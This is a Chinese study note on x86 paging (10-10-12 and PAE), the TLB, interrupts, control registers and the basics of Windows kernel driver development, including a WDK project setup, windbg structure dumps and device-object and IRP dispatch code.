PDI与PTI\n因为PDE是页目录表项，PTE是页表项。那么PDI就是页目录表索引，而PTI就是页表索引（Index）。在我们的10-10-12分页中，第一个10就是PDI，第二个10就是PTI，12就是物理页的页内偏移。\n访问页目录表的公式：0xC0300000 + PDI * 4 访问页表的公式：0xC0000000 + PDI * 4096 + PTI * 4（就是挨个差一个页0x1000） !vtop Cr3 线性地址 通过这个指令可以直接得到PDE和PTE😊 2-9-9-12分页（PAE分页） 先回顾一下10-10-12分页：\n为什么是12：因为最后要找的物理页大小为4kb，所以需要2^12来覆盖所有的地址，也就是所谓的页内偏移。 PTT里面的PTE指向物理页，PTE一共有1024个所以需要2^10来找全1024个成员，也就是所谓的PDI。 PDT里面的PDE指向PTT，与PTE类似，所以也需要2^10来找全1024个成员，也就是所谓的PTI。 通过以上，CPU通过10-10-12分页可以找到的内存一共有4GB，这个通过CPU识别的内存可不是通过上面的表乘起来的，是因为一个内存地址最多只有32位，所以可以找到的内存为2^32 = 4GB。 为什么要有2-9-9-12分页，其实还是物理页不够用了，需要扩展。主要就是将地址的长度变长了，物理地址由32位改为了36位。那么PDE与PTE也要将base增加4位，4字节对齐之后就是8字节。对PTT来说成员数量从1024个变为了512个，所以需要2^9来索引；与PDT一样，所以也需要2^9来索引。这就是两个9的来源。通过之前的改变应该可以算出来一个PDT就代表能够索引1GB的内存，所以在前面又有叫PDPTE的结构来指向PDT，这个PDPTE结构有8个字节，所以这个结构一共有4个。这就是2的来源。这样就可以索引一个4GB的内存啦！\nPDPTT结构：\nPDPTE共有四项（第一个2） 35~12存储的是页目录表的基址，低12位补0，共36位，即页目录基址。 其中，Avali位是给操作系统使用的。 PDE结构：\n↑是一般页\n↑是大页\n注意：\n当PS=1时是大页， 35-21位是大页的物理地址，这样36位的物理地址的低21位为0，这就意味着页的大小为2MB，且都是2MB对齐。 当PS=0时，35-12位是页表基址，低12位补0，共36位。 PTE结构：\n注意：\nPTE中35-12是物理页基址，24位，低12位补0\n物理页基址+12位的页内偏移指向具体数据\nXD位：\n它是一个位，处于PDE和PTE的最高位。其实就是linux保护机制里面的NX(禁止执行)，NX是栈上的内容不可执行；而XD是数据区不可执行，如果最高位是1，说明被保护。如果这个是数据区，且这个X位被置为1，则会被报出异常不能执行。\n公式总结：\n2(PDPTI)-9(PDI)-9(PTI)-12(OFFSET) pPDE = 0xc0600000 + (PDPTI*4KB) + (PDI*8) pPTE = 0xc0000000 + (PDPTI*2MB) + (PDI*4KB) + (PTI*8) 针对MmIsAddressValid的公式如下：\npPDE = (int*)(0xc0600000 + ((addr \u003e\u003e 18) \u0026 0x3ff8)) pPTE = (int*)(0xc0000000 + ((addr \u003e\u003e 9) \u0026 0x7ffff8)) TLB TLB(Translation Lookaside Buffer)其实就是实现了一个物理地址对线性地址的映射关系，提供缓存提高读写效率。\n结构如下：\nLA（线性地址） PA（物理地址） ATTR（属性） LRU（统计） 0x81010111 …… …… 1 其中：\nATTR（属性）：如果是2-9-9-12分页，属性是PDPE、PDE、PTE三个属性相**\u0026\u0026。如果是10-10-12分页就是PDE和PTE两个属性相\u0026\u0026**。 不同的CPU这个表的大小不一样。 只要Cr3变了，TLB立马刷新，一核一套TLB。 操作系统的高2G映射基本不变，如果Cr3改了，TLB刷新重建高2G以上很浪费。所以PDE和PTE中有个G标志位，如果G位为1刷新TLB时将不会刷新PDE/PTE的G位为1的页，当TLB满了，根据统计信息将不常用的地址废弃，最近最常用的保留。\nTLB有不同的种类，用于不同的缓存目的，它在X86体系里的实际应用最早是从Intel的486CPU开始的，在X86体系的CPU里边，一般都设有如下4组TLB：\n第一组：缓存一般页表（4K字节页面）的指令页表缓存：Instruction-TLB 第二组：缓存一般页表（4K字节页面）的数据页表缓存：Data-TLB 第三组：缓存大尺寸页表（2M/4M字节页面）的指令页表缓存：Instruction-TLB 第四组：缓存大尺寸页表（2M/4M字节页面）的数据页表缓存：Data-TLB 中断与异常 什么是中断？\n中断通常是由CPU外部的输入输出设备（硬件）所触发的，供外部设备通知CPU “有事情需要处理” ，因此又叫中断请求（Interrupt Request） 中断请求的目的是希望CPU暂时停止执行当前正在执行的程序，转去执行中断请求所对应的中断处理例程（中断处理程序在哪由IDT表决定） 80×86有两条中断请求线： 非屏蔽中断线，称为NMI (NonMaskable Interrupt) 可屏蔽中断线，称为INTR（Interrupt Require） 非屏蔽中断如何处理？\nCPU会查IDT表中的2号中断：\n（IDT表）中断号 NMI 说明 0x2 不可屏蔽中断 80x86中固定为0x2 解释：当非可屏蔽中断产生时，CPU在执行完当前指令后会里面进入中断处理程序。非可屏蔽中断不受EFLAG寄存器中IF位的影响，一旦发生，CPU必须处理非可屏蔽中断处理程序位于IDT表中的2号位置\n可屏蔽中断\n在硬件级，可屏蔽中断是由一块专门的芯片来管理的，通常称为中断控制器。它负责分配中断资源和管理各个中断源发出的中断请求为了便于标识各个中断请求，中断管理器通常用IRQ（Interrupt Request）后面加上数字来表示不同的中断。 比如：在Windows中时钟中断的IRQ编号为0也就是：IRQ0 可屏蔽中断如何处理？\n中断号如下：\n（IDT表）中断号 IRQ 说明 0x30 IRQ0 时钟中断 0x31~0x3F IRQ1~IRQ15 其他硬件设备的中断 解释：\n如果自己的程序执行时不希望CPU去处理这些中断，可以\n用CLI指令清空EFLAG寄存器中的IF位\n用STI指令设置EFLAG寄存器中的IF位\n硬件中断与IDT表中的对应关系并非固定不变的，参见：APIC（高级可编程中断控制器）\n异常\n异常通常是CPU在执行指令时检测到的某些错误，比如除0、访问无效页面等。中断与异常的区别：\n中断来自于外部设备，是中断源（比如键盘）发起的，CPU是被动的 异常来自于CPU本身，是CPU主动产生的 INT N虽然被称为 “软件中断” ，但其本质是异常。EFLAG的IF位对INT N无效 无论是由硬件设备触发的中断请求还是由CPU产生的异常，处理程序都在IDT表。\n常见异常处理的对应调用号：\n错误类型 （IDT表）中断号 页错误 0xE 段错误 0xD 除零错误 0x0 双重错误 0x8 控制寄存器 控制寄存器用于控制和确定CPU的操作模式\n一共有5个控制寄存器：Cr0，Cr1，Cr2，Cr3，Cr4\n其中Cr1保留，Cr3为页目录表基址\nCr0寄存器\nPE位是启用保护模式（Protection Enable）标志。\n若PE = 1是开启保护模式，反之为实地址模式。这个标志仅开启段级保护，而并没有启用分页机制。若要启用分页机制，那么PE和PG标志都要置位。\nPG位是启用分页机制。在开启这个标志之前必须已经或者同时开启PE标志。\nPG = 0且PE = 0，处理器工作在实地址模式下。\nPG = 0且PE = 1，处理器工作在没有开启分页机制的保护模式下。\nPG = 1且PE = 0，在PE没有开启的情况下无法开启PG。\nPG = 1且PE = 1，处理器工作在开启了分页机制的保护模式下。\nWP位对于Intel 80486或以上的CPU，是写保护（Write Proctect）标志。当设置该标志时，处理器会禁止超级用户程序（例如特权级0的程序）向用户级只读页面执行写操作；\n当CPL \u003c 3的时候：\n如果WP = 0可以读写任意用户级物理页，只要线性地址有效。\n如果WP = 1可以读取任意用户级物理页，但对于只读的物理页，则不能写。\nCr2寄存器\n当CPU访问某个无效页面时，会产生缺页异常，此时，CPU会将引起异常的线性地址存放在Cr2中。\nCr4寄存器\nPAE = 1是2-9-9-12分页PAE = 0是10-10-12分页。其实就是那个boot.ini文件里面我们修改的那个来判断的，操作系统希望我们用什么样的分页来启动操作系统。\nPSE是大页是否开启的总开关，如果置0，就算PDE中设置了大页你也得是普通的页。\nPSE PS 分页类型 页大小 1 1 2-9-9-12 2M 1 0 2-9-9-12 4K 1 1 10-10-12 4M 1 0 10-10-12 4K 0 1 2-9-9-12 4K 0 0 2-9-9-12 4K 0 1 10-10-12 4K 0 0 10-10-12 4K PWT 与 PCD CPU缓存\nCPU缓存是位于CPU与物理内存之间的临时存储器，它的容量比内存小的多但是交换速度却比内存要快得多。它可以做的很大。\nCPU缓存与TLB类似但有所不同，TLB存的是线性地址与物理地址的对应关系，CPU缓存存的是物理地址与内容对应关系。\nCPU缓存的对应关系 TLB的对应关系 物理地址 线性地址 内容 物理地址 PWT_PCD:\nPWT全称为Page Write Through，PWT = 1时，写Cache的时候也要将数据写入内存中。\nPCD全称为Page Cache Disable，PCD = 1时，禁止某个页写入缓存，直接写内存。比如，做页表用的页，已经存储在TLB中了，可能不需要再缓存了。\n驱动 环境 先从32位的系统开始学习，安装一下VS2010+WDK7600，远古版本。\n里面设置属性表的代码如下：\n\u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003cProject ToolsVersion=\"4.0\" xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\"\u003e \u003cImportGroup Label=\"PropertySheets\" /\u003e \u003cPropertyGroup Label=\"UserMacros\" /\u003e \u003cPropertyGroup\u003e \u003cExecutablePath\u003eC:\\WinDDK\\7600.16385.1\\bin\\x86;$(ExecutablePath)\u003c/ExecutablePath\u003e \u003c/PropertyGroup\u003e \u003cPropertyGroup\u003e \u003cIncludePath\u003eC:\\WinDDK\\7600.16385.1\\inc\\api;C:\\WinDDK\\7600.16385.1\\inc\\ddk;C:\\WinDDK\\7600.16385.1\\inc\\crt;$(IncludePath)\u003c/IncludePath\u003e \u003c/PropertyGroup\u003e \u003cPropertyGroup\u003e \u003cLibraryPath\u003eC:\\WinDDK\\7600.16385.1\\lib\\win7\\i386;$(LibraryPath)\u003c/LibraryPath\u003e \u003cTargetExt\u003e.sys\u003c/TargetExt\u003e \u003cLinkIncremental\u003efalse\u003c/LinkIncremental\u003e \u003cGenerateManifest\u003efalse\u003c/GenerateManifest\u003e \u003c/PropertyGroup\u003e \u003cItemDefinitionGroup\u003e \u003cClCompile\u003e \u003cPreprocessorDefinitions\u003e_X86_;DBG\u003c/PreprocessorDefinitions\u003e \u003cCallingConvention\u003eStdCall\u003c/CallingConvention\u003e \u003cExceptionHandling\u003efalse\u003c/ExceptionHandling\u003e \u003cBasicRuntimeChecks\u003eDefault\u003c/BasicRuntimeChecks\u003e \u003cBufferSecurityCheck\u003efalse\u003c/BufferSecurityCheck\u003e \u003cCompileAs\u003eDefault\u003c/CompileAs\u003e \u003cDebugInformationFormat\u003eProgramDatabase\u003c/DebugInformationFormat\u003e \u003c/ClCompile\u003e \u003cLink\u003e \u003cAdditionalDependencies\u003entoskrnl.lib;wdm.lib;wdmsec.lib;wmilib.lib;ndis.lib;Hal.lib;MSVCRT.LIB;LIBCMT.LIB;%(AdditionalDependencies)\u003c/AdditionalDependencies\u003e \u003c/Link\u003e \u003cLink\u003e \u003cIgnoreAllDefaultLibraries\u003etrue\u003c/IgnoreAllDefaultLibraries\u003e \u003cEnableUAC\u003efalse\u003c/EnableUAC\u003e \u003cSubSystem\u003eNative\u003c/SubSystem\u003e \u003cEntryPointSymbol\u003eDriverEntry\u003c/EntryPointSymbol\u003e \u003cBaseAddress\u003e0x10000\u003c/BaseAddress\u003e \u003cRandomizedBaseAddress\u003e \u003c/RandomizedBaseAddress\u003e \u003cDataExecutionPrevention\u003e \u003c/DataExecutionPrevention\u003e \u003cGenerateDebugInformation\u003etrue\u003c/GenerateDebugInformation\u003e \u003cDriver\u003eDriver\u003c/Driver\u003e \u003c/Link\u003e \u003c/ItemDefinitionGroup\u003e \u003cItemGroup /\u003e \u003c/Project\u003e 记住要修改C:\\WinDDK\\7600.16385.1这个为WDK的路径。\n文章\n上面的，属性管理器在视图—-\u003e其他窗口\n内核编程基础 在应用层编程我们可以使用WINDOWS提供的各种API函数，只要导入头文件windows.h就可以了。但是在内核编程的时候，微软为内核程序提供了专用的API，只要在程序中包含相应的头文件就可以使用了，如：#include \u003cntddk.h\u003e，假设你安装了WDK。\n为什么要用两个头文件：为了安全，因为内核很脆弱，用3环的头文件就压力大了；而且一个没进0环一个进0环了，不一样。\n在应用层编程的时候，我们通过MSDN来了解函数的详细信息，在内核编程的时候，要使用WDK自己的帮助文档。\nWDK说明文档中只包含了内核模块导出的函数，对于未导出的函数，则不能直接使用。如果要德用未导出的函数，只要自己定义一个函数指针，并且为函数指针提供正确的函数地址就可以使用了。有两种办法都可以获取为导出的函数地址：\n特征码搜索 解析内核PDB文件（就是windbg中可以使用u 函数名来获取函数的反汇编的原因） 补充 解释 未导出函数 导出表里面没有该函数，文档里面自然没有该函数 未文档化函数 文档里面没有写该函数，但在导出表里面有该函数 基本数据类型\n在内核编程的时候，强烈建议大家遵守WDK的编码习惯，建议不要这样写：unsigned long length;，建议这样写：ULONG length。\n习惯使用WDK自己的类型：\nWDK 习惯 SDK 习惯 ULONG unsigned long PULONG unsigned long* UCHAR unsigned char PUCHAR unsigned char* UINT unsigned int PUNIT unsigned int* VOID void PVOID void* 返回值\n大部分内核函数的返回值都是NTSTATUS类型，如：\nNTSTATUS PsCreateSystemThread(); NTSTATUS ZwOpenProcess(); NTSTATUS ZwOpenEvent(); 这个值能说明函数执行的结果，比如：\n#define STATUS_SUCCESS 0x00000000 //成功 #define STATUS_INVALID_PARAMETER 0xC000000D //参数无效 #define STATUS_BUFFER_OVERFLOW 0x80000005 //缓冲区长度不够 //…… //这里每一个值都有一个对应的宏，那么在执行一个内核函数后可以判断返回值为STATUS_XXXXXX，就可以判断函数的执行状态了，可读性好一些 当你调用的内核函数，如果返回的结果不是STATUS_SUCCESS，就说明函数执行中遇到了问题，具体是什么问题，可以在ntstatus.h文件中查看。\n异常处理\n在内核中，一个小小的错误就可能导致蓝屏，比如：读写一个无效的内存地址。为了让自己的内核程序更加健壮，强烈建议大家在编写内核程序时，使用异常处理。\nWindows提供了结构化异常处理机制，一般的编译器都是支持的，如下：\n__try{ //可能出错的代码 } __except(filter_value) { //出错时要执行的代码 } 出现异常时，可根据filter_value的值来决定程序该如果执行，当filter_value的值为：\nEXCEPTION_EXECUTE_HANDLER(1)：代码进入except块 EXCEPTION_CONTINUE_SEARCH(0)：不处理异常，由上一层调用函数处理 EXCEPTION_CONTINUE_EXECUTION(-1)：回去继续执行错误处的代码 常用的内核内存函数\n对内存的使用，主要就是：申请、设置、拷贝以及释放。\nc语言 内核中 malloc ExAllocatePoolWithTag memset RtlFillMemory memcpy RtlMoveMemory free ExFreePool 请注意ExAllocatePoolWithTag函数的POOL_TYPE PoolType参数：\ntypedef enum _POOL_TYPE { NonPagedPool, PagedPool, NonPagedPoolMustSucceed, DontUseThisType, NonPagedPoolCacheAligned, PagedPoolCacheAligned, NonPagedPoolCacheAlignedMustS } POOL_TYPE; NonPagedPool代表非分页内存，PagedPool代表分页内存\n非分页内存：物理页很重要，系统不会放到硬盘上的内存（常驻，存代码）\n分页内存：物理页没那么重要，允许把物理页写到硬盘上的内存（存数据）\nIRQL\n什么是中断请求级别：就是CPU在执行时会遇到中断时会执行中断程序，但是如果在执行时又遇到了中断，这时该执行哪个中断程序呢？此时就需要看两个中断的中断级别了（中断是分等级的！），如果现在CPU执行中断的等级高于又遇到的中断，那么就忽略这个新来的中断；否则就会终止当前的中断程序，转去执行新来的中断程序（被打断了）。 IRQL是Windows自己定义的一套优先级方案，与CPU无关，数值越大权限越高，相同权限无法互相打断，只有更高的权限才能打断。 CPU任何时刻必须必须在IRQL中处于某一等级。 内核字符串种类\n在编写3环程序我们经常用：CHAR(char)/WCHAR(wchar_t)来分别表示宅字符串和宽字符串，用0表示结尾。但是在内核中，我们常用：ANSI_STRING/UNICODE_STRING来分别表示宅字符串和宽字符串。它们的结构如下：\nANSI_STRING字符串：\ntypedef struct _STRING { USHORT Length; USHORT MaximumLength; PCHAR Buffer; }STRING; UNICODE_STRING字符串：\ntypedef struct _UNICODE_STRING { USHORT Length; USHORT MaxmumLength; PWSTR Buffer; } UNICODE_STRING; 内核字符串常用函数\n符串常用的功能无非就是：创建、复制、比较以及转换等等。\n操作 ANSI_STRING字符串 UNICODE_STRING字符串 初始化 RtlInitAnsiString RtlInitUnicodeString 拷贝 RtlCopyString RtlCopyUnicodeString 比较 RtlCompareString RtlCompareUnicodeString 转换 RtlAnsiStringToUnicodeString RtlUnicodeStringToAnsiString 内核空间与内核模块 之前了解到，每个进程都有4GB虚拟空间，而且低2GB所对应的物理页基本不同；高2GB内存所对应的物理页基本相同（共用）\n硬件种类繁多，不可能做一个兼容所有硬件的内核，所以，微软提供规定的接口格式，让硬件驱动人员安装规定的格式编写驱动程序 。\n在内核中，这些驱动程序每一个都是一个模块，称为内核模块，都可以加载到内核中，都遵守PE结构。但本质上讲，任意一个sys文件与内核文件没有区别。每个驱动都是一个模块。就和在3环的程序加载dll一样，加载一个贴上一个。\n做练习可以了解到入口函数为NTSTATUS DriverEntry(PDRIVER_OBJECT driver, PUNICODE_STRING reg_path)，需要注意它的第一个参数：\nDRIVER_OBJECT（驱动对象）描述了当前该模块的一些重要信息\nkd\u003e dt _DRIVER_OBJECT nt!_DRIVER_OBJECT +0x000 Type : Int2B +0x002 Size : Int2B +0x004 DeviceObject : Ptr32 _DEVICE_OBJECT +0x008 Flags : Uint4B +0x00c DriverStart : Ptr32 Void //驱动从哪里开始的 +0x010 DriverSize : Uint4B //部署的驱动有多大 +0x014 DriverSection : Ptr32 Void +0x018 DriverExtension : Ptr32 _DRIVER_EXTENSION +0x01c DriverName : _UNICODE_STRING //驱动叫什么名字 +0x024 HardwareDatabase : Ptr32 _UNICODE_STRING +0x028 FastIoDispatch : Ptr32 _FAST_IO_DISPATCH +0x02c DriverInit : Ptr32 long +0x030 DriverStartIo : Ptr32 void +0x034 DriverUnload : Ptr32 void +0x038 MajorFunction : [28] Ptr32 long 请注意里面的成员DriverSection，一个指针对应结构体的双向循环链表LDR_DATA_TABLE_ENTRY，它圈着内核里面的所有模块（就是查看成员InLoadOrderLinks就行了）\nkd\u003e dt _LDR_DATA_TABLE_ENTRY nt!_LDR_DATA_TABLE_ENTRY +0x000 InLoadOrderLinks : _LIST_ENTRY +0x008 InMemoryOrderLinks : _LIST_ENTRY +0x010 InInitializationOrderLinks : _LIST_ENTRY +0x018 DllBase : Ptr32 Void +0x01c EntryPoint : Ptr32 Void +0x020 SizeOfImage : Uint4B +0x024 FullDllName : _UNICODE_STRING +0x02c BaseDllName : _UNICODE_STRING +0x034 Flags : Uint4B +0x038 LoadCount : Uint2B +0x03a TlsIndex : Uint2B +0x03c HashLinks : _LIST_ENTRY +0x03c SectionPointer : Ptr32 Void +0x040 CheckSum : Uint4B +0x044 TimeDateStamp : Uint4B +0x044 LoadedImports : Ptr32 Void +0x048 EntryPointActivationContext : Ptr32 Void +0x04c PatchInformation : Ptr32 Void 我们使用工具将驱动加载的第一步就是先注册驱动，就是在注册表里面写上驱动，第二个参数reg_path就是将驱动写在注册表里面的什么地方\n在3环里面，有一块内存描述线程的信息，就是TEB。FS:[0]就指向这个结构体：\nkd\u003e dt _TEB nt!_TEB +0x000 NtTib : _NT_TIB +0x01c EnvironmentPointer : Ptr32 Void +0x020 ClientId : _CLIENT_ID +0x028 ActiveRpcHandle : Ptr32 Void +0x02c ThreadLocalStoragePointer : Ptr32 Void +0x030 ProcessEnvironmentBlock : Ptr32 _PEB +0x034 LastErrorValue : Uint4B +0x038 CountOfOwnedCriticalSections : Uint4B +0x03c CsrClientThread : Ptr32 Void +0x040 Win32ThreadInfo : Ptr32 Void +0x044 User32Reserved : [26] Uint4B +0x0ac UserReserved : [5] Uint4B +0x0c0 WOW32Reserved : Ptr32 Void +0x0c4 CurrentLocale : Uint4B +0x0c8 FpSoftwareStatusRegister : Uint4B +0x0cc SystemReserved1 : [54] Ptr32 Void +0x1a4 ExceptionCode : Int4B +0x1a8 ActivationContextStack : _ACTIVATION_CONTEXT_STACK +0x1bc SpareBytes1 : [24] UChar +0x1d4 GdiTebBatch : _GDI_TEB_BATCH +0x6b4 RealClientId : _CLIENT_ID +0x6bc GdiCachedProcessHandle : Ptr32 Void +0x6c0 GdiClientPID : Uint4B +0x6c4 GdiClientTID : Uint4B +0x6c8 GdiThreadLocalInfo : Ptr32 Void +0x6cc Win32ClientInfo : [62] Uint4B +0x7c4 glDispatchTable : [233] Ptr32 Void +0xb68 glReserved1 : [29] Uint4B +0xbdc glReserved2 : Ptr32 Void +0xbe0 glSectionInfo : Ptr32 Void +0xbe4 glSection : Ptr32 Void +0xbe8 glTable : Ptr32 Void +0xbec glCurrentRC : Ptr32 Void +0xbf0 glContext : Ptr32 Void +0xbf4 LastStatusValue : Uint4B +0xbf8 StaticUnicodeString : _UNICODE_STRING +0xc00 StaticUnicodeBuffer : [261] Uint2B +0xe0c DeallocationStack : Ptr32 Void +0xe10 TlsSlots : [64] Ptr32 Void +0xf10 TlsLinks : _LIST_ENTRY +0xf18 Vdm : Ptr32 Void +0xf1c ReservedForNtRpc : Ptr32 Void +0xf20 DbgSsReserved : [2] Ptr32 Void +0xf28 HardErrorsAreDisabled : Uint4B +0xf2c Instrumentation : [16] Ptr32 Void +0xf6c WinSockData : Ptr32 Void +0xf70 GdiBatchCount : Uint4B +0xf74 InDbgPrint : UChar +0xf75 FreeStackOnTermination : UChar +0xf76 HasFiberData : UChar +0xf77 IdealProcessor : UChar +0xf78 Spare3 : Uint4B +0xf7c ReservedForPerf : Ptr32 Void +0xf80 ReservedForOle : Ptr32 Void +0xf84 WaitingOnLoaderLock : Uint4B +0xf88 Wx86Thread : _Wx86ThreadState +0xf94 TlsExpansionSlots : Ptr32 Ptr32 Void +0xf98 ImpersonationLocale : Uint4B +0xf9c IsImpersonating : Uint4B +0xfa0 NlsCache : Ptr32 Void +0xfa4 pShimData : Ptr32 Void +0xfa8 HeapVirtualAffinity : Uint4B +0xfac CurrentTransactionHandle : Ptr32 Void +0xfb0 ActiveFrame : Ptr32 _TEB_ACTIVE_FRAME +0xfb4 SafeThunkCall : UChar +0xfb5 BooleanSpare : [3] UChar 可以看到，在TEB的成员中的0x30，存储着进程环境块（PEB）。它描述着进程里面的信息：\nkd\u003e dt _PEB nt!_PEB +0x000 InheritedAddressSpace : UChar +0x001 ReadImageFileExecOptions : UChar +0x002 BeingDebugged : UChar +0x003 SpareBool : UChar +0x004 Mutant : Ptr32 Void +0x008 ImageBaseAddress : Ptr32 Void +0x00c Ldr : Ptr32 _PEB_LDR_DATA +0x010 ProcessParameters : Ptr32 _RTL_USER_PROCESS_PARAMETERS +0x014 SubSystemData : Ptr32 Void +0x018 ProcessHeap : Ptr32 Void +0x01c FastPebLock : Ptr32 _RTL_CRITICAL_SECTION +0x020 FastPebLockRoutine : Ptr32 Void +0x024 FastPebUnlockRoutine : Ptr32 Void +0x028 EnvironmentUpdateCount : Uint4B +0x02c KernelCallbackTable : Ptr32 Void +0x030 SystemReserved : [1] Uint4B +0x034 AtlThunkSListPtr32 : Uint4B +0x038 FreeList : Ptr32 _PEB_FREE_BLOCK +0x03c TlsExpansionCounter : Uint4B +0x040 TlsBitmap : Ptr32 Void +0x044 TlsBitmapBits : [2] Uint4B +0x04c ReadOnlySharedMemoryBase : Ptr32 Void +0x050 ReadOnlySharedMemoryHeap : Ptr32 Void +0x054 ReadOnlyStaticServerData : Ptr32 Ptr32 Void +0x058 AnsiCodePageData : Ptr32 Void +0x05c OemCodePageData : Ptr32 Void +0x060 UnicodeCaseTableData : Ptr32 Void +0x064 NumberOfProcessors : Uint4B +0x068 NtGlobalFlag : Uint4B +0x070 CriticalSectionTimeout : _LARGE_INTEGER +0x078 HeapSegmentReserve : Uint4B +0x07c HeapSegmentCommit : Uint4B +0x080 HeapDeCommitTotalFreeThreshold : Uint4B +0x084 HeapDeCommitFreeBlockThreshold : Uint4B +0x088 NumberOfHeaps : Uint4B +0x08c MaximumNumberOfHeaps : Uint4B +0x090 ProcessHeaps : Ptr32 Ptr32 Void +0x094 GdiSharedHandleTable : Ptr32 Void +0x098 ProcessStarterHelper : Ptr32 Void +0x09c GdiDCAttributeList : Uint4B +0x0a0 LoaderLock : Ptr32 Void +0x0a4 OSMajorVersion : Uint4B +0x0a8 OSMinorVersion : Uint4B +0x0ac OSBuildNumber : Uint2B +0x0ae OSCSDVersion : Uint2B +0x0b0 OSPlatformId : Uint4B +0x0b4 ImageSubsystem : Uint4B +0x0b8 ImageSubsystemMajorVersion : Uint4B +0x0bc ImageSubsystemMinorVersion : Uint4B +0x0c0 ImageProcessAffinityMask : Uint4B +0x0c4 GdiHandleBuffer : [34] Uint4B +0x14c PostProcessInitRoutine : Ptr32 void +0x150 TlsExpansionBitmap : Ptr32 Void +0x154 TlsExpansionBitmapBits : [32] Uint4B +0x1d4 SessionId : Uint4B +0x1d8 AppCompatFlags : _ULARGE_INTEGER +0x1e0 AppCompatFlagsUser : _ULARGE_INTEGER +0x1e8 pShimData : Ptr32 Void +0x1ec AppCompatInfo : Ptr32 Void +0x1f0 CSDVersion : _UNICODE_STRING +0x1f8 ActivationContextData : Ptr32 Void +0x1fc ProcessAssemblyStorageMap : Ptr32 Void +0x200 SystemDefaultActivationContextData : Ptr32 Void +0x204 SystemAssemblyStorageMap : Ptr32 Void +0x208 MinimumStackCommit : Uint4B 看PEB，里面0x00c处的Ldr，里面存放着3个链表：\nkd\u003e dt _PEB_LDR_DATA nt!_PEB_LDR_DATA +0x000 Length : Uint4B +0x004 Initialized : UChar +0x008 SsHandle : Ptr32 Void +0x00c InLoadOrderModuleList : _LIST_ENTRY //\u003c=第一个（加载顺序） +0x014 InMemoryOrderModuleList : _LIST_ENTRY //\u003c=第二个（内存顺序） +0x01c InInitializationOrderModuleList : _LIST_ENTRY //\u003c=第三个（初始化顺序） +0x024 EntryInProgress : Ptr32 Void 这三个链表记录了当前进程有哪些模块，与0环的LDR_DATA_TABLE_ENTRY类似\n0环与3环通信（常规方式） 设备对象\n我们在开发窗口程序的时候，消息被封装成一个结构体：MSG。在内核开发时，消息被封装成另外一个结构体：IRP（I/O Request Package）。\n在窗口程序中，能够接收消息的只能是窗口对象。在内核中，能够接收IRP消息的只能是设备对象。\n通信流程\n创建设备对象\n如何理解：正常来说一个设备对象对应一个硬件，但是也可以什么都不对应，就是一个抽象的概念：只有结构体没有硬件\n//创建设备名称 UNICODE_STRING Devicename; RtlInitUnicodeString(\u0026Devicename,L\"\\\\Device\\\\MyDevice\"); //创建设备 IoCreateDevice( pDriver, //当前设备所属的驱动对象，一个设备对象必须属于某一个驱动对象 0, \u0026Devicename, //设备对象的名称 FILE_DEVICE_UNKNOWN, //没有对应的设备就是这个UNKNOWN FILE_DEVICE_SECURE_OPEN, FALSE, \u0026pDeviceObj //设备对象指针 ); 设置交互数据的方式\npDeviceObj-\u003eFlags |= DO_BUFFERED_IO; 缓冲区方式读写(DO_BUFFERED_IO) ：操作系统将应用程序提供缓冲区的数据复制到内核模式下的地址中。\n直接方式读写(DO_DIRECT_IO) ：操作系统会将用户模式下的缓冲区锁住。然后操作系统将这段缓冲区在内核模式地址再次映射一遍。这样，用户模式的缓冲区和内核模式的缓冲区指向的是同一区域的物理内存。缺点就是要单独占用物理页面。\n其他方式读写（在调用IoCreateDevice创建设备后对pDevObj-\u003eFlags即不设置DO_BUFFERED_IO也不设置DO_DIRECT_IO此时就是其他方式。）\n在使用其他方式读写设备时，派遣函数直接读写应用程序提供的缓冲区地址。在驱动程序中，直接操作应用程序的缓冲区地址是很危险的。只有驱动程序与应用程序运行在相同线程上下文的情况下，才能使用这种方式。如果CPU中的任务切换了，即CR3切换掉了，在高2GB的驱动仍在使用该方式读取低2GB内存，导致读到的数据和实际不符，导致错误，故强烈不推荐此方式。\n创建符号链接\n就是让3环的程序找到你的驱动对象。设备名称的作用是给内核对象用的，如果要在3环访问，必须要有符号链接。其实就是一个别名，没有这个别名，在3环不可见。\n//创建符号链接名称 RtlInitUnicodeString(\u0026SymbolicLinkName,L\"\\\\??\\\\MyTestDriver\"); //创建符号链接 IoCreateSymbolicLink(\u0026SymbolicLinkName,\u0026Devicename); 内核模式下，符号链接是以\\??\\开头的，如C盘就是\\??\\C:。而在用户模式下，则是以\\\\.\\开头的，如C盘就是\\\\.\\C:\nIRP\n类比一下，在图形界面上是通过鼠标单击或双机来调用回调函数，而在内核里面则是通过调用对应的函数来执行派遣函数的\n在3环调用CreateFile函数，操作系统就会封装一个IRP派发给设备对象，设备对象通过IRP的类型调用对应的派发函数。\n当应用层通过CreateFile、ReadFile、WriteFile、CloseHandle等函数打开、从设备读取数据、向设备写入数据、关闭设备的时候，会使操作系统分别产生出IRP_MJ_CREATE、IRP_MJ_READ、IRP_MJ_WRITE、IRP_MJ_CLOSE等不同的IRP。\n其他类型的IRP：\nIRP类型 来源 IRP_MJ_DEVICE_CONTROL 使用 DeviceControl 函数时产生（最多的方式） IRP_MJ_POWER 在操作系统处理电源消息时产生 IRP_MJ_SHUTDOWN 关闭系统前时产生 派遣函数\n如何注册派遣函数：其实每一个IRP都对应一个值，那么你提供的派遣函数就应该写在成员MajorFunction下标对应的位置。\nkd\u003e dt _DRIVER_OBJECT ntdll!_DRIVER_OBJECT +0x000 Type : Int2B +0x002 Size : Int2B +0x004 DeviceObject : Ptr32 _DEVICE_OBJECT +0x008 Flags : Uint4B +0x00c DriverStart : Ptr32 Void +0x010 DriverSize : Uint4B +0x014 DriverSection : Ptr32 Void +0x018 DriverExtension : Ptr32 _DRIVER_EXTENSION +0x01c DriverName : _UNICODE_STRING +0x024 HardwareDatabase : Ptr32 _UNICODE_STRING +0x028 FastIoDispatch : Ptr32 _FAST_IO_DISPATCH +0x02c DriverInit : Ptr32 long +0x030 DriverStartIo : Ptr32 void +0x034 DriverUnload : Ptr32 void +0x038 MajorFunction : [28] Ptr32 long 代码形式：\n//设置卸载函数 pDriverObject-\u003eDriverUnload = 卸载函数; //设置派遣函数 pDriverObject-\u003eMajorFunction[IRP_MJ_CREATE] = 派遣函数1; pDriverObject-\u003eMajorFunction[IRP_MJ_CLOSE] = 派遣函数2; pDriverObject-\u003eMajorFunction[IRP_MJ_WRITE] = 派遣函数3; pDriverObject-\u003eMajorFunction[IRP_MJ_READ] = 派遣函数4; 